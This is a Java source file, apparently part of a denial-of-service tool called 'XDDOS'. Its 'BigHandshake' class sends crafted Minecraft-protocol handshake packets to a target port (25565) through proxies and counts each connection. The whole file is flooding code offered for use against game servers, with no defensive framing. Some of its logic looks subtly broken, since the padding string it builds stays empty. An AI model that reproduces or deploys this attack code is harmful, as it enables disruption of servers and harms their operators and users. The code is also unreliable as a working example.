package XD.XDDOS.methods.impl;

import XD.XDDOS.methods.IMethod;
import XD.XDDOS.utils.NettyBootstrap;
import XD.XDDOS.utils.proxy.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.io.IOException;

public class BigHandshake implements IMethod {

  private String lol = "";

  private int a = 1024;

  public BigHandshake() {
    for (int i = 1; i < this.a + 1; i++)
      this.lol += String.valueOf(this.lol);
  }
  
  public static void writeVarInt(ByteBufOutputStream out, int paramInt) throws IOException {
    while ((paramInt & 0xFFFFFF80) != 0) {
      out.writeByte(paramInt & 0x7F | 0x80);
      paramInt >>>= 7;
    } 
    out.writeByte(paramInt);
  }

  
  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    ByteBuf b = Unpooled.buffer();
    ByteBufOutputStream out = new ByteBufOutputStream(b);
    try {
      out.writeByte(1037);
      out.writeByte(0);
      out.writeBytes(this.lol);
      out.writeByte(9);
      out.writeBytes(proxy.addrs.getHostName());
      out.writeShort(25565);
      out.writeByte(1);
      out.close();
    } catch (IOException e) {
      e.printStackTrace();
    } 
    channel.writeAndFlush(b);
    NettyBootstrap.integer++;
    NettyBootstrap.totalConnections++;
    channel.close();
  }
}
